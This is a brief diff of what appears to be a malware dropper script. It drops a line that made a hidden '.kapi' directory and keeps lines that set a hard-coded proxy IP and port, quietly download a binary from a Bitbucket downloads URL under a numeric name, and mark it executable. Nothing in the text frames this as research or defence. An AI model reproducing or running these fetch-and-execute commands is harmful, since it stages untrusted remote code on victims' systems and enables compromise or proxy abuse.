@@ -1,4 +1,3 @@
-mkdir .kapi && cd .kapi
 proxy="192.252.209.155" 
 port="14455" 
 wget -q -O 0083075176 https://bitbucket.org/excel-gms/bin/downloads/zypex && chmod +x 0083075176
